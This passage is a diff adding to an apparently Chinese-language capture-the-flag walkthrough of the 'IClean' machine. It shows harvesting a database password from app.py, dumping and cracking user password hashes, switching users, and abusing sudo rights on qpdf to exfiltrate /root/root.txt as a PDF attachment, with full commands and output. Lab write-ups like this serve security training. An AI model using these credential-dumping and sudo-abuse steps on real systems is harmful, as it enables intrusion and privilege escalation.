@@ -107,3 +107,179 @@ payload
 拿到rev shell
 
 ![](IClean_files/3.jpg)
+
+
+app.py暴露出数据库密码
+```
+# Database Configuration
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}
+```
+
+用户表
+```
+www-data@iclean:/opt/app$ mysql -u iclean -p           
+mysql -u iclean -p
+Enter password: pxCsmnGLckUb
+
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| capiclean          |
+| information_schema |
+| performance_schema |
++--------------------+
+3 rows in set (0.01 sec)
+
+mysql> use capiclean;
+use capiclean;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++---------------------+
+| Tables_in_capiclean |
++---------------------+
+| quote_requests      |
+| services            |
+| users               |
++---------------------+
+3 rows in set (0.00 sec)
+
+mysql> select * from users;
+select * from users;
++----+----------+------------------------------------------------------------------+----------------------------------+
+| id | username | password                                                         | role_id                          |
++----+----------+------------------------------------------------------------------+----------------------------------+
+|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
+|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
++----+----------+------------------------------------------------------------------+----------------------------------+
+2 rows in set (0.00 sec)
+
+mysql> 
+
+```
+consuela的哈希解出来密文密码是：```simple and clean```
+
+正是用户的密码
+```
+www-data@iclean:/opt/app$ su consuela
+su consuela
+Password: simple and clean
+
+consuela@iclean:/opt/app$ 
+
+```
+
+也可以ssh登录
+
+# 提权
+
+
+sudo 特权
+```
+consuela@iclean:~$ sudo -l
+[sudo] password for consuela: 
+Matching Defaults entries for consuela on iclean:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf
+consuela@iclean:~$ 
+
+```
+
+尝试执行
+```
+consuela@iclean:~$ sudo /usr/bin/qpdf
+
+qpdf: an input file name is required
+
+For help:
+  qpdf --help=usage       usage information
+  qpdf --help=topic       help on a topic
+  qpdf --help=--option    help on an option
+  qpdf --help             general help and a topic list
+
+```
+
+把root.txt作为附件放入1.pdf
+```
+consuela@iclean:/tmp$ sudo -S /usr/bin/qpdf --empty 1.pdf -qdf --add-attachment /root/root.txt --
+```
+查看1.pdf,可以看到root.txt
+```
+consuela@iclean:/tmp$ strings 1.pdf
+%PDF-1.3
+%QDF-1.0
+%% Original object ID: 1 0
+1 0 obj
+  /Names <<
+    /EmbeddedFiles 2 0 R
+  >>
+  /PageMode /UseAttachments
+  /Pages 3 0 R
+  /Type /Catalog
+endobj
+%% Original object ID: 5 0
+2 0 obj
+  /Names [
+    (root.txt)
+    4 0 R
+endobj
+%% Original object ID: 2 0
+3 0 obj
+  /Count 0
+  /Kids [
+  /Type /Pages
+endobj
+%% Original object ID: 4 0
+4 0 obj
+  /EF <<
+    /F 5 0 R
+    /UF 5 0 R
+  >>
+  /F (root.txt)
+  /Type /Filespec
+  /UF (root.txt)
+endobj
+%% Original object ID: 3 0
+5 0 obj
+  /Params <<
+    /CheckSum <d04ed9c1fb76363ae01813c53282fc84>
+    /CreationDate (D:20240730082514Z)
+    /ModDate (D:20240730082514Z)
+    /Size 33
+  >>
+  /Type /EmbeddedFile
+  /Length 6 0 R
+stream
+d4eddf40caed3ab97481938049fd6948
+endstream
+endobj
+6 0 obj
+endobj
+xref
+0000000000 65535 f 
+0000000052 00000 n 
+0000000203 00000 n 
+0000000292 00000 n 
+0000000381 00000 n 
+0000000522 00000 n 
+0000000783 00000 n 
+trailer <<
+  /Root 1 0 R
+  /Size 7
+  /ID [<9653a9f96670fb1e17d1ef5fd55224be><9653a9f96670fb1e17d1ef5fd55224be>]
+startxref
+%%EOF
+
+```
